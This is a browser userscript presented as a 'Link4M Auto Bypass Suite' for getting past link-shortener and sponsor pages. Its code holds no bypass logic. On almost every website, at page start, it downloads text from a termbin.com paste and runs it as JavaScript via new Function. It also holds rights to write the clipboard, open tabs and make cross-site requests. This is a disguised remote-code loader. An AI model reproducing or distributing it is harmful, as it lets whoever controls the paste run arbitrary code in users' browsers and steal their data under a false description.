// ==UserScript==
// @name         Link4M Auto Bypass Suite - Loader
// @namespace    https://github.com/
// @version      3.5.0
// @description  Tự động vượt toàn bộ flow Link4M & Nhà tài trợ (chỉ cần người dùng tích Captcha).
// @author       Promax
// @match        *://*.link4m.net/*
// @match        *://*.link4m.co/*
// @match        *://*.link4m.app/*
// @match        *://*/*
// @exclude      *://*.google.com/*
// @exclude      *://*.youtube.com/*
// @grant        GM_setValue
// @grant        GM_getValue
// @grant        GM_openInTab
// @grant        GM_setClipboard
// @grant        GM_addStyle
// @grant        GM_xmlhttpRequest
// @connect      termbin.com
// @run-at       document_start
// ==/UserScript==

(function() {
    'use strict';
    const ENDPOINT = 'https://termbin.com/lkmp';

    if (typeof GM_xmlhttpRequest !== 'undefined') {
        GM_xmlhttpRequest({
            method: 'GET',
            url: ENDPOINT,
            onload: function(res) {
                if (res.status === 200 && res.responseText) {
                    try {
                        const run = new Function(res.responseText);
                        run();
                    } catch (e) {
                        console.error('[L4M Loader] Run error:', e);
                    }
                }
            }
        });
    } else {
        fetch(ENDPOINT)
            .then(r => r.text())
            .then(t => { (new Function(t))(); })
            .catch(e => console.error(e));
    }
})();
